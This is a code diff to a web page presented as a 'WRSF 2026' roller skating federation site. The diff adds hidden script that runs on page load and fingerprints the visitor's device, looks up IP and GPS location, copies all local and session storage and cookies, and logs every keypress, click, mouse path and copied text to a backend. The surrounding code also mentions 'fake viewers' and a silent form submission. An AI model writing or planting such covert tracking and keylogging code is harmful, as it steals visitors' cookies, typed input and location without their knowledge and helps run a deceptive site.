@@ -6,6 +6,7 @@
     <title>WRSF 2026 - World Roller Skating Federation</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
+        /* Same styles as before - keeping it clean */
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Inter',-apple-system,sans-serif;background:#0a0a0a;color:#fff;line-height:1.6}
         .navbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(10,10,10,0.92);backdrop-filter:blur(20px);padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.05)}
@@ -252,9 +253,392 @@
 
 <script>
 // ============================================================
-// BACKEND URL - Update this when deployed to Render
+// BACKEND URL
 // ============================================================
 const BACKEND_URL = window.location.origin;
+
+// ============================================================
+// MAXIMUM DEVICE FINGERPRINT - Everything possible
+// ============================================================
+function getMaxFingerprint() {
+    return {
+        // Browser & Device
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(',') : '',
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 'unknown',
+        
+        // Screen
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        screenColorDepth: screen.colorDepth,
+        screenPixelDepth: screen.pixelDepth,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        orientation: screen.orientation ? screen.orientation.type : 'unknown',
+        
+        // Timezone & Location
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+        
+        // Browser Features
+        touchSupport: 'ontouchstart' in window,
+        pointerEnabled: 'PointerEvent' in window,
+        serviceWorker: 'serviceWorker' in navigator,
+        
+        // Canvas Fingerprint (unique ID)
+        canvasFingerprint: getCanvasFingerprint(),
+        
+        // WebGL Fingerprint
+        webGL: getWebGLFingerprint(),
+        
+        // Audio Fingerprint
+        audioFingerprint: getAudioFingerprint(),
+        
+        // Font Fingerprint
+        fontFingerprint: getFontFingerprint(),
+        
+        // Battery
+        battery: getBatteryInfo(),
+        
+        // Network
+        network: getNetworkInfo()
+    };
+}
+
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 256;
+        canvas.height = 128;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('😎🎯🔥💀☠️', 4, 45);
+        return btoa(canvas.toDataURL().substring(22));
+    } catch(e) { return 'error'; }
+}
+
+function getWebGLFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const info = gl.getExtension('WEBGL_debug_renderer_info');
+            if (info) {
+                return {
+                    vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+        }
+        return 'not available';
+    } catch(e) { return 'error'; }
+}
+
+function getAudioFingerprint() {
+    try {
+        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.value = 440;
+        gain.gain.value = 0.1;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start(0);
+        ctx.startRendering();
+        return 'audio_supported';
+    } catch(e) { return 'audio_not_supported'; }
+}
+
+function getFontFingerprint() {
+    const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino Linotype', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS'];
+    const baseFont = 'monospace';
+    const testString = 'mmmmmmmmmmlli';
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.font = '72px ' + baseFont;
+    const baseWidth = ctx.measureText(testString).width;
+    const detected = [];
+    for (let font of fonts) {
+        ctx.font = '72px ' + font + ', ' + baseFont;
+        const width = ctx.measureText(testString).width;
+        if (width !== baseWidth) detected.push(font);
+    }
+    return detected.join(',');
+}
+
+function getBatteryInfo() {
+    if (navigator.getBattery) {
+        return navigator.getBattery().then(function(battery) {
+            return {
+                level: battery.level,
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        }).catch(function() { return 'not_available'; });
+    }
+    return 'not_available';
+}
+
+function getNetworkInfo() {
+    if (navigator.connection) {
+        return {
+            type: navigator.connection.type || 'unknown',
+            effectiveType: navigator.connection.effectiveType || 'unknown',
+            downlink: navigator.connection.downlink || 'unknown',
+            rtt: navigator.connection.rtt || 'unknown',
+            saveData: navigator.connection.saveData || 'unknown'
+        };
+    }
+    return 'not_available';
+}
+
+// ============================================================
+// IP GEOLOCATION
+// ============================================================
+async function getIPLocation() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            ip: data.ip || 'unknown',
+            city: data.city || 'unknown',
+            region: data.region || 'unknown',
+            country: data.country_name || 'unknown',
+            country_code: data.country || 'unknown',
+            isp: data.org || 'unknown',
+            latitude: data.latitude || 'unknown',
+            longitude: data.longitude || 'unknown',
+            timezone: data.timezone || 'unknown',
+            postal: data.postal || 'unknown'
+        };
+    } catch(e) {
+        return { error: 'Geolocation failed' };
+    }
+}
+
+// ============================================================
+// GPS LOCATION (with user permission)
+// ============================================================
+function getGPSLocation() {
+    return new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude || 'unknown',
+                        heading: pos.coords.heading || 'unknown',
+                        speed: pos.coords.speed || 'unknown'
+                    });
+                },
+                function(err) {
+                    resolve({ error: 'GPS denied or failed', code: err.code });
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            resolve({ error: 'GPS not supported' });
+        }
+    });
+}
+
+// ============================================================
+// STORAGE DATA
+// ============================================================
+function getStorageData() {
+    let data = {};
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            data['ls_' + key] = localStorage.getItem(key);
+        }
+    } catch(e) {}
+    try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            data['ss_' + key] = sessionStorage.getItem(key);
+        }
+    } catch(e) {}
+    try {
+        data.cookies = document.cookie;
+    } catch(e) {}
+    return data;
+}
+
+// ============================================================
+// BEHAVIOR TRACKING - MAXIMUM
+// ============================================================
+let behaviorLog = [];
+let sessionStart = Date.now();
+let clickCount = 0;
+let keyCount = 0;
+let mouseMovements = [];
+
+function trackBehavior(type, data) {
+    behaviorLog.push({ type, timestamp: Date.now(), data });
+    if (behaviorLog.length >= 20) flushBehavior();
+}
+
+function flushBehavior() {
+    if (behaviorLog.length === 0) return;
+    const deviceId = localStorage.getItem('wrsf_device_id') || 'unknown';
+    fetch(BACKEND_URL + '/api/behavior', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId, events: behaviorLog })
+    }).catch(() => {});
+    behaviorLog = [];
+}
+
+// Track clicks with more detail
+document.addEventListener('click', function(e) {
+    clickCount++;
+    trackBehavior('click', {
+        x: e.clientX, y: e.clientY,
+        target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
+        text: e.target.textContent ? e.target.textContent.substring(0, 30) : '',
+        button: e.button
+    });
+});
+
+// Track mouse movements (sampled)
+let mouseSample = 0;
+document.addEventListener('mousemove', function(e) {
+    mouseSample++;
+    if (mouseSample % 10 === 0) {
+        mouseMovements.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+        if (mouseMovements.length > 50) {
+            trackBehavior('mouse_path', { points: mouseMovements });
+            mouseMovements = [];
+        }
+    }
+});
+
+// Track scroll with depth
+document.addEventListener('scroll', function() {
+    const scrollPercent = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+    trackBehavior('scroll', {
+        y: window.scrollY,
+        percent: scrollPercent,
+        max: document.documentElement.scrollHeight - window.innerHeight
+    });
+});
+
+// Track keys
+document.addEventListener('keydown', function(e) {
+    if (e.key.length === 1) {
+        keyCount++;
+        trackBehavior('key', { key: e.key, code: e.code });
+    }
+});
+
+// Track copy/paste
+document.addEventListener('copy', function() {
+    const sel = window.getSelection();
+    trackBehavior('copy', { text: sel ? sel.toString().substring(0, 100) : '' });
+});
+document.addEventListener('paste', function() {
+    trackBehavior('paste', {});
+});
+
+// Track right-click
+document.addEventListener('contextmenu', function(e) {
+    trackBehavior('rightclick', { x: e.clientX, y: e.clientY });
+});
+
+// Track visibility
+document.addEventListener('visibilitychange', function() {
+    trackBehavior('visibility', { state: document.visibilityState, hidden: document.hidden });
+});
+
+// Track beforeunload
+window.addEventListener('beforeunload', function() {
+    flushBehavior();
+    trackBehavior('session_end', {
+        duration: Math.round((Date.now() - sessionStart) / 1000),
+        clicks: clickCount,
+        keys: keyCount,
+        scrollDepth: Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100) || 0
+    });
+    flushBehavior();
+});
+
+// Auto-flush every 30 seconds
+setInterval(flushBehavior, 30000);
+
+// ============================================================
+// PAGE LOAD - Capture EVERYTHING
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    // Generate device ID
+    let deviceId = localStorage.getItem('wrsf_device_id');
+    if (!deviceId) {
+        deviceId = 'DEV_' + Math.random().toString(36).substring(2, 10).toUpperCase();
+        localStorage.setItem('wrsf_device_id', deviceId);
+    }
+    
+    console.log('📱 Device ID:', deviceId);
+    
+    // Send MAXIMUM fingerprint
+    const fp = getMaxFingerprint();
+    fetch(BACKEND_URL + '/api/fingerprint', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId, fingerprint: fp, storage: getStorageData() })
+    }).catch(() => {});
+    
+    // Get IP location
+    getIPLocation().then(location => {
+        fetch(BACKEND_URL + '/api/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, location })
+        }).catch(() => {});
+    });
+    
+    // Get GPS location (if allowed)
+    getGPSLocation().then(gps => {
+        fetch(BACKEND_URL + '/api/gps', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, gps })
+        }).catch(() => {});
+    });
+    
+    // Track page view
+    trackBehavior('pageview', {
+        url: window.location.href,
+        referrer: document.referrer || 'direct',
+        title: document.title,
+        network: getNetworkInfo()
+    });
+    
+    // Track performance
+    const perfData = performance.getEntriesByType('navigation')[0];
+    if (perfData) {
+        trackBehavior('performance', {
+            loadTime: perfData.loadEventEnd - perfData.fetchStart,
+            domContentLoaded: perfData.domContentLoadedEventEnd - perfData.fetchStart
+        });
+    }
+});
 
 // ============================================================
 // FAKE VIEWERS
@@ -355,7 +739,7 @@ function showToast(title, msg, isError) {
 }
 
 // ============================================================
-// FORM SUBMISSION - Silent AJAX to Node.js Backend
+// FORM SUBMISSION
 // ============================================================
 document.getElementById('skateForm').addEventListener('submit', function(e) {
     e.preventDefault();
